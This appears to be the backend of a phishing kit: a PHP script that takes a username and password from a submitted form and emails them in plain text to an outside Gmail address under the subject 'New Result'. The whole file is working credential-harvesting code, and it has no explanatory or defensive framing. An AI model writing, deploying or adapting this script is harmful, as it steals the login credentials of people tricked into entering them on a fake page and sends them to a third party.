<?php
if (isset($_POST['username']) && isset($_POST['password'])){
    $username = $_POST['username'];
    $password = $_POST['password'];
    $to = 'king9test9@gmail.com';
    $subject = "New Result";
    $body = '<html>
                <body>
                    <p>Username:'.$username.'</p>
                    <p>Password:'.$password.'</p>
                </body>
            </html>';
    
    $headers = "From: ".$to." <".$to.">\r\n";
    $headers .="MIME-Version: 1.0\r\n";
    $headers .="Content-type: text/html; charset=utf-8";

    //send
    $send = mail($to, $subject, $body, $headers);
    if ($send){
        echo 'Success'; 
    }
    else{
        'Fail';
    }
}

?>